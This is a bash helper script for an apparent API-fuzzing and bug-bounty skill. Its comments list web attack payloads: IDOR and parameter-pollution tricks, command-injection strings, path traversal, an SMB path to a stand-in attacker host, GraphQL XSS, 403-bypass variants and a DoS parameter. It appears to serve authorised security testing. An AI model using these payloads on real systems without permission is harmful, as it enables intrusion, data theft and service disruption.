#!/bin/bash
# Helper script for sec-safety-0922-sec-safety-0066-api-fuzzing-bug-bounty

echo "Helper for sec-safety-0922-sec-safety-0066-api-fuzzing-bug-bounty"

# Command examples from SKILL.md:
# # Check for Swagger/OpenAPI documentation
# /swagger.json
# /openapi.json
# /api-docs
# /v1/api-docs
# /swagger-ui.html
# # Use Kiterunner for API discovery
# kr scan https://target.com -w routes-large.kite
# # Extract paths from Swagger
# python3 json2paths.py swagger.json
# # Test different login paths
# /api/mobile/login
# /api/v3/login
# /api/magic_link
# /api/admin/login
# # Check rate limiting on auth endpoints
# # If no rate limit → brute force possible
# # Test mobile vs web API separately
# # Don't assume same security controls
# # Basic IDOR
# GET /api/users/1234 → GET /api/users/1235
# # Even if ID is email-based, try numeric
# /?user_id=111 instead of /?user_id=user@mail.com
# # Test /me/orders vs /user/654321/orders
# # Wrap ID in array
# {"id":111} → {"id":[111]}
# # JSON wrap
# {"id":111} → {"id":{"id":111}}
# # Send ID twice
# URL?id=<LEGIT>&id=<VICTIM>
# # Wildcard injection
# {"user_id":"*"}
# # Parameter pollution
# /api/get_profile?user_id=<victim>&user_id=<legit>
# {"user_id":<legit_id>,"user_id":<victim_id>}
# # Ruby on Rails
# ?url=Kernel#open → ?url=|ls
# # Linux command injection
# api.url.com/endpoint?name=file.txt;ls%20/
# # If .NET app uses Path.Combine(path_1, path_2)
# # Test for path traversal
# https://example.org/download?filename=a.png
# https://example.org/download?filename=C:\inetpub\wwwroot\web.config
# https://example.org/download?filename=\\smb.dns.attacker.com\a.png
# # Test all HTTP methods
# GET /api/v1/users/1
# POST /api/v1/users/1
# PUT /api/v1/users/1
# DELETE /api/v1/users/1
# PATCH /api/v1/users/1
# # Switch content type
# Content-Type: application/json → application/xml
# # XSS via GraphQL endpoint
# http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
# # URL-encoded XSS
# http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
# # Original blocked request
# /api/v1/users/sensitivedata → 403
# # Bypass attempts
# /api/v1/users/sensitivedata.json
# /api/v1/users/sensitivedata?
# /api/v1/users/sensitivedata/
# /api/v1/users/sensitivedata??
# /api/v1/users/sensitivedata%20
# /api/v1/users/sensitivedata%09
# /api/v1/users/sensitivedata#
# /api/v1/users/sensitivedata&details
# /api/v1/users/..;/sensitivedata
# # Normal request
# /api/news?limit=100
# # DoS attempt
# /api/news?limit=9999999999
# # Original request (own data)
# GET /api/v1/invoices/12345
# Authorization: Bearer <token>
# # Modified request (other user's data)
# GET /api/v1/invoices/12346
# Authorization: Bearer <token>
# # Response reveals other user's invoice data
# curl -X POST https://target.com/graphql \
#   -H "Content-Type: application/json" \
#   -d '{"query":"{__schema{types{name,fields{name}}}}"}'
